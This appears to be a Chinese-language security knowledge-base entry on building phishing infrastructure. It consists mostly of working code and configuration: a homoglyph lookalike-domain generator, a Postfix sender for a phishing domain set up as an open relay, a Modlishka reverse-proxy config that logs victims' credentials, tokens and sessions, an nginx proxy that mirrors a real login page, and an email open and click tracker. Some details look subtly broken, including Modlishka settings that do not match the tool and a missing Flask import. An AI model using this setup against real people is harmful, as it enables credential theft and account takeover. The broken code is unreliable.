---
id: 23-004
title: "⚙️ 钓鱼基础设施搭建 (Phishing Infrastructure)"
category: 社会工程学
category_en: "Social Engineering"
difficulty: ★★★★
tools: "GoPhish, Modlishka, Muraena, Evilginx2, Nginx"
last_updated: 2025-07
tags: ["social-engineering", "phishing", "vishing", "physical-security", "awareness"]
subdomain: social-engineering
nist_csf: ["PR.AT-01", "PR.AT-02"]
mitre_attack: ["T1566", "T1598", "T1204"]
---
# ⚙️ 钓鱼基础设施搭建 (Phishing Infrastructure)

## 概述

钓鱼基础设施包括域名注册、邮件服务器配置、SSL证书、反向代理和追踪系统。专业的基础设施可以显著提高钓鱼测试的成功率和隐蔽性。

## 核心技能

### 1. 钓鱼域名注册策略

```bash
# 域名相似度攻击策略

# 1. IDN Homograph 攻击 (使用Unicode同形字)
# 例: microsoft.com → micrοsoft.com (ο是希腊字母omicron)
# 使用Python生成同形字域名
python3 << 'EOF'
import itertools

homoglyphs = {
    'a': ['а', 'ɑ', 'α', 'à', 'á'],
    'c': ['с', 'ϲ', 'ⅽ'],
    'e': ['е', 'ё', 'ē', 'ė'],
    'i': ['і', 'í', 'ï', 'ī'],
    'o': ['о', 'ο', 'σ', 'ö', 'ø'],
    'p': ['р', 'ρ'],
    's': ['ѕ', 'ş'],
    'x': ['х', '×'],
    'y': ['у', 'γ']
}

def generate_homograph_domains(base_domain):
    domains = []
    for i, char in enumerate(base_domain):
        if char in homoglyphs:
            for glyph in homoglyphs[char]:
                new_domain = base_domain[:i] + glyph + base_domain[i+1:]
                domains.append(new_domain)
    return domains[:10]  # 限制返回数量

print(generate_homograph_domains('paypal'))
EOF

# 2. 子域名伪装
# paypal.com.auth-login.xyz
# login-microsoft.com (连接符混淆)

# 3. TLD差异
# company.cn → company.co / company.org

# 4. 关键词附加
# microsoft-verify.com / apple-security.com

# 使用DNSTwist检测钓鱼域名
pip install dnstwist
dnstwist --registered --format csv paypal.com > paypal_typos.csv
dnstwist --ssdeep paypal.com  # 模糊哈希相似性检测
```

### 2. 邮件服务器配置

```bash
# Postfix 钓鱼邮件服务器配置
apt-get install postfix opendkim opendmarc

# 主配置 (/etc/postfix/main.cf)
cat << 'EOF' >> /etc/postfix/main.cf
myhostname = mail.phish-domain.com
mydomain = phish-domain.com
myorigin = $mydomain
inet_interfaces = all
mydestination = $myhostname, localhost.$mydomain, $mydomain
relayhost = 
mynetworks = 0.0.0.0/0
smtpd_banner = $myhostname ESMTP Unknown
smtpd_helo_required = yes
disable_vrfy_command = yes
smtpd_etrn_restrictions = reject
EOF

# DKIM 配置
cd /etc/opendkim
opendkim-genkey -D /etc/opendkim/keys/ -d phish-domain.com -s default
chown opendkim:opendkim /etc/opendkim/keys/default.private

# 添加 DKIM 域名记录到DNS
# default._domainkey.phish-domain.com  TXT "v=DKIM1; h=sha256; k=rsa; p=..."

# SPF 记录
# phish-domain.com  TXT "v=spf1 mx ip4:YOUR_IP ~all"

# DMARC 记录
# _dmarc.phish-domain.com  TXT "v=DMARC1; p=none; rua=mailto:admin@phish-domain.com"

# 发送测试邮件
echo "This is a test phishing email" | mail -s "Test" -r "security@phish-domain.com" target@victim.com
```

### 3. 反向代理钓鱼 (Modlishka)

```bash
# Modlishka 配置与部署
git clone https://github.com/drk1wi/Modlishka.git
cd Modlishka
make

# 配置文件
cat << 'EOF' > config.json
{
    "proxy": {
        "listening_ip": "0.0.0.0",
        "listening_port": "443",
        "use_tls": true,
        "cert_file": "server.crt",
        "key_file": "server.key"
    },
    "target": {
        "domain": "login.target.com",
        "subdomains": ["accounts", "auth", "login"],
        "terminate_js": true,
        "force_ssl": true
    },
    "phishing": {
        "domain": "login-security.target-verify.com",
        "exact_response_copy": true,
        "track_credentials": true,
        "track_tokens": true,
        "track_session": true,
        "collect_assets": true,
        "collect_tokens": true
    },
    "logging": {
        "log_all": true,
        "log_to_file": "modlishka.log",
        "output_templates": {
            "credential": "CRED: {{.Email}} : {{.Password}}",
            "token": "TOKEN: {{.Token}} : {{.Type}}"
        }
    },
    "telegram": {
        "enable": false
    }
}
EOF

# 启动Modlishka
./Modlishka -config config.json
```

### 4. SSL证书与HTTPS配置

```bash
# 使用Let's Encrypt获取合法SSL证书
# 需要域名指向你的服务器
apt-get install certbot
certbot certonly --standalone -d phish-domain.com -d www.phish-domain.com

# 自动续期
certbot renew --dry-run

# 支持通配符证书
certbot certonly --manual --preferred-challenges dns -d *.phish-domain.com

# 自签名证书（用于内网测试）
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes \
  -subj "/C=CN/ST=Beijing/L=Beijing/O=Security Test/OU=IT/CN=*.company-test.com"

# Nginx反向代理SSL配置
cat << 'EOF' > /etc/nginx/sites-enabled/phishing
server {
    listen 443 ssl http2;
    server_name login.phish-domain.com;
    
    ssl_certificate /etc/letsencrypt/live/phish-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/phish-domain.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    
    location / {
        proxy_pass https://login.real-target.com;
        proxy_set_header Host login.real-target.com;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto https;
        proxy_ssl_verify off;
        proxy_buffering off;
        sub_filter_once off;
        sub_filter 'login.real-target.com' 'login.phish-domain.com';
    }
    
    access_log /var/log/nginx/phishing_access.log;
    error_log /var/log/nginx/phishing_error.log;
}
EOF
```

### 5. 追踪像素与数据收集

```python
#!/usr/bin/env python3
# 邮件追踪像素服务

from flask import Flask, send_file, request
import sqlite3
import datetime
import base64

app = Flask(__name__)

def init_db():
    conn = sqlite3.connect('tracking.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS opens
                 (id INTEGER PRIMARY KEY, email TEXT, template TEXT,
                  ip TEXT, user_agent TEXT, opened_at TIMESTAMP)''')
    c.execute('''CREATE TABLE IF NOT EXISTS clicks
                 (id INTEGER PRIMARY KEY, email TEXT, url TEXT,
                  ip TEXT, user_agent TEXT, clicked_at TIMESTAMP)''')
    conn.commit()
    conn.close()

@app.route('/track/<encoded_email>/<template_id>.png')
def track_open(encoded_email, template_id):
    """1x1 透明追踪像素"""
    email = base64.b64decode(encoded_email).decode('utf-8')
    conn = sqlite3.connect('tracking.db')
    c = conn.cursor()
    c.execute("INSERT INTO opens (email, template, ip, user_agent, opened_at) VALUES (?,?,?,?,?)",
              (email, template_id, request.remote_addr, 
               request.headers.get('User-Agent'), datetime.datetime.now()))
    conn.commit()
    conn.close()
    
    # 返回1x1透明PNG
    return send_file('pixel.png', mimetype='image/png')

@app.route('/click/<encoded_email>/<redirect_url>')
def track_click(encoded_email, redirect_url):
    """链接点击追踪"""
    email = base64.b64decode(encoded_email).decode('utf-8')
    url = base64.b64decode(redirect_url).decode('utf-8')
    conn = sqlite3.connect('tracking.db')
    c = conn.cursor()
    c.execute("INSERT INTO clicks (email, url, ip, user_agent, clicked_at) VALUES (?,?,?,?,?)",
              (email, url, request.remote_addr,
               request.headers.get('User-Agent'), datetime.datetime.now()))
    conn.commit()
    conn.close()
    return redirect(url)  # 重定向到真实URL

if __name__ == '__main__':
    init_db()
    app.run(host='0.0.0.0', port=8080, ssl_context=('cert.pem', 'key.pem'))
```

## 常用工具

| 工具 | 用途 | 链接 |
|:---|:---|:---|
| Modlishka | 反向代理钓鱼框架 | https://github.com/drk1wi/Modlishka |
| Muraena | 透明反向代理 | https://github.com/muraenateam/muraena |
| Evilginx2 | 企业凭证窃取框架 | https://github.com/kgretzky/evilginx2 |
| dnstwist | 域名相似度检测 | https://github.com/elceef/dnstwist |
| Postfix | 邮件服务器 | https://www.postfix.org/ |
| Certbot | SSL证书自动化 | https://certbot.eff.org/ |

## 参考资源

- [APWG Phishing Activity Trends Report](https://apwg.org/trendsreports/)
- [Phishing Infrastructure Detection](https://www.cisa.gov/stopransomware)
- [MITRE ATT&CK T1583.001 — Domains](https://attack.mitre.org/techniques/T1583/001/)
- [OWASP Phishing Guide](https://owasp.org/www-community/attacks/Phishing)
